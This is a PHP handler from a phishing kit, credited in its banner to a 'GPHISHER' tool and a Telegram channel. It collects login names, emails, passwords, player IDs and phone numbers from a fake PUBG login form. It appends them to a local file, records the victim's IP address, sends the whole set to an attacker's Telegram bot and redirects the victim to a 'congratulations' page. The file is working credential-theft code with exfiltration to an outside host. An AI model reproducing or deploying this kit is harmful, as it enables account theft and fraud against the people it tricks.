<?php 
if ( 'POST' != $_SERVER['REQUEST_METHOD'] ) {
$protocol = $_SERVER['SERVER_PROTOCOL'];
if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0' ) ) ) {
$protocol = 'HTTP/1.0';
}

header( 'Allow: POST' );
header( "$protocol 405 Method Not Allowed" );
header( 'Content-Type: text/plain' );
exit;
}
include 'telegram.php';

//print info
<?php 
file_put_contents("usernames.txt", "LOGIN: " . $_POST['LOGIN'] . " EMAIL: " . $_POST['EMAIL'] . " PASSWORD: " . $_POST['PASSWORD'] ."\n", FILE_APPEND);
?>

//Get IP
function getClientIP() {
$ipaddress = '';
if (getenv('HTTP_CLIENT_IP'))
$ipaddress = getenv('HTTP_CLIENT_IP');
else if(getenv('HTTP_X_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
else if(getenv('HTTP_X_FORWARDED'))
$ipaddress = getenv('HTTP_X_FORWARDED');
else if(getenv('HTTP_FORWARDED_FOR'))
$ipaddress = getenv('HTTP_FORWARDED_FOR');
else if(getenv('HTTP_FORWARDED'))
$ipaddress = getenv('HTTP_FORWARDED');
else if(getenv('REMOTE_ADDR'))
$ipaddress = getenv('REMOTE_ADDR');
else
$ipaddress = 'UNKNOWN';
return $ipaddress;
}


//post info
$EMAIL = ($_POST['email']);
$PASSWORD = ($_POST['password']);
$playid = ($_POST['playid']);
$phone = ($_POST['phone']);
$level = ($_POST['level']);
$LOGIN = ($_POST['login']);
$IP = getClientIP();

//send to BOT
$details = "
╔[•] New #PUBG Added
╠=======L-O-G-I-N=======
╠[+] Login : $LOGIN
╠[+] Account : $EMAIL
╠[+] Password : $PASSWORD
╠[+] PlayerID : $playid
╠[+] Level :  $level
╠[+] Phone/Email :  $phone
╠[+] IP : $IP
╠====S-U-P-P-O-R-T======
║[•] CHANNL : @firerepo
║[•] TOOL   : GPHISHER
╚[•] SCRIPT : @NgScript
";
    
//bot info
$ok = 
    file_get_contents("https://api.telegram.org/bot".$TOKEN."/sendMessage?parse_mode=HTML&chat_id=".$ID."&text=".urlencode($details));

    echo "<form id='22' method='POST' action='congratulations.php'>
    <input type='hidden' name='refresh'>
    </form>
    <script type='text/javascript'>document.getElementById('22').submit();</script>";
?>
